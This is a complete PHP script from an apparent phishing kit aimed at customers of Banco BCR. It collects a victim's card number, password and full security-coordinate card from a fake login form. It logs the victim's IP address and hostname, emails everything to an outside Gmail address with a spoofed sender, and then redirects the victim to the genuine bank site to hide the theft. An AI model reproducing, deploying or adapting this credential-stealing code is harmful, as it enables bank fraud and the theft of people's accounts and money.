<?php
session_start();
$notarjeta = $_POST['notarjeta'];
$passwordp = $_POST['passwordp'];
$ip6 = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$ipv = getenv("REMOTE_ADDR");
$dat3 =date("D M d, Y ");
$to  = "equipo13111@gmail.com";
$subj = "ACCESOS BANCOBCR - $ipv";
$msj = "\n
	
--------------------------- Coordenadas de $ipv --------------------------------
<html>
<head>
<body>
<table width='200' border='1'>
  <tr>
    <td bgcolor='#ff0000'>&nbsp;</td>
    <td bgcolor='#ff0000'><font color='#ffffff' size='4'>A</font></td>
    <td bgcolor='#ff0000'><font color='#ffffff' size='4'>B</font></td>
    <td bgcolor='#ff0000'><font color='#ffffff' size='4'>C</font></td>
    <td bgcolor='#ff0000'><font color='#ffffff' size='4'>D</font></td>
    <td bgcolor='#ff0000'><font color='#ffffff' size='4'>E</font></td>
    <td bgcolor='#ff0000'><font color='#ffffff' size='4'>F</font></td>
    <td bgcolor='#ff0000'><font color='#ffffff' size='4'>G</font></td>
    <td bgcolor='#ff0000'><font color='#ffffff' size='4'>H</font></td>
<td bgcolor='#ff0000'><font color='#ffffff' size='4'>I</font></td>
<td bgcolor='#ff0000'><font color='#ffffff' size='4'>j</font></td>	
 
  </tr>
  <tr>
    <td bgcolor='#ff0000'><font color='#000000' size='4'>1</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['a1']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['b1']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['c1']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['o1']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['d1']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['v1']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['z1']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['l1']}</font></td>
<td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['i1']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['j1']}</font></td>
   
   
  </tr>

  <tr>
    <td bgcolor='#ff0000'><font color='#000000' size='4'>2</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['a2']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['b2']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['c2']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['o2']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['d2']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['v2']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['z2']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['l2']}</font></td>
   <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['i2']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['j2']}</font></td>
   
  </tr>  
  
  <tr>
    <td bgcolor='#ff0000'><font color='#000000' size='4'>3</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['a3']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['b3']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['c3']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['o3']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['d3']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['v3']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['z3']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['l3']}</font></td>
   <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['i3']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['j3']}</font></td>
   
  </tr>  
  
  <tr>
    <td bgcolor='#ff0000'><font color='#000000' size='4'>4</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['a4']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['b4']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['c4']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['o4']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['d4']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['v4']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['z4']}</font></td>
    <td bgcolor='#bf0000'><font color='#000000' size='4'>{$_POST['l4']}</font></td>
   <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['i4']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['j4']}</font></td>
   
  </tr>  
  
  <tr>
    <td bgcolor='#ff0000'><font color='#000000' size='4'>5</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['a5']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['b5']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['c5']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['o5']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['d5']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['v5']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['z5']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['l5']}</font></td>
   <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['i5']}</font></td>
    <td bgcolor='#ffffff'><font color='#000000' size='4'>{$_POST['j5']}</font></td>
   
  </tr>  
  
  
</table>
</body>
</html>
 	 <br>
	 Tarjeta: $notarjeta<br>
	 Clave  : $passwordp<br>
	 Ip:	  $ipv<br>
     Host:    $ip6<br>
	 Fecha:	  $dat3<br><br>
	 
----------------------------------------------------------------<br>
  ";
  
$headers = "From: BDV ClaveCoord <bdv@bdv.com>\n";
$headers .= "Content-Type: text/html; charset=iso-8859-1\n";
$headers .= "\n";
mail($to, $subj, $msj,$headers);
header("Location: http://www.bancobcr.com");
?>
